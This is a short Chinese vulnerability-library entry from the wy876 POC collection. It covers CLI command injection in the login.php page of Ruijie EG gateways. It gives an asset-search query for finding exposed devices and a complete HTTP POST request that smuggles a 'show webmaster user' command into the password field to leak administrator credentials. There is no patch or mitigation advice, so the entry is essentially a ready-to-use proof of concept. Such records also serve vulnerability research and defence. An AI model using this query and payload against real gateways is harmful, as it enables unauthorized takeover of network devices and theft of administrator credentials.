---
version: "锐捷EG易网关"
source: "wy876 漏洞文库"
---

# 锐捷 EG易网关管理员账号密码泄露漏洞

**<font style="color:rgb(38, 38, 38);">一、漏洞简介</font>**<font style="color:rgb(38, 38, 38);">  
</font><font style="color:rgb(38, 38, 38);">锐捷EG易网关 login.php存在 CLI命令注入，导致管理员账号密码泄露漏洞  
</font>**<font style="color:rgb(38, 38, 38);">二、影响版本</font>**

```java
锐捷EG易网关
```

<font style="color:rgb(38, 38, 38);">  
</font>**<font style="color:rgb(38, 38, 38);">三、资产测绘</font>**

```java
app="Ruijie-EG易网关"
```

<font style="color:rgb(38, 38, 38);">  
</font><font style="color:rgb(38, 38, 38);">●登录页面</font>


<font style="color:rgb(38, 38, 38);">  
</font>**<font style="color:rgb(38, 38, 38);">四、漏洞复现</font>**<font style="color:rgb(38, 38, 38);"></font>

```java
POST /login.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 49
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

username=admin&password=admin?show+webmaster+user
```

<font style="color:rgb(38, 38, 38);">  
</font>


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ewl6ikmuyvguq1ps>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
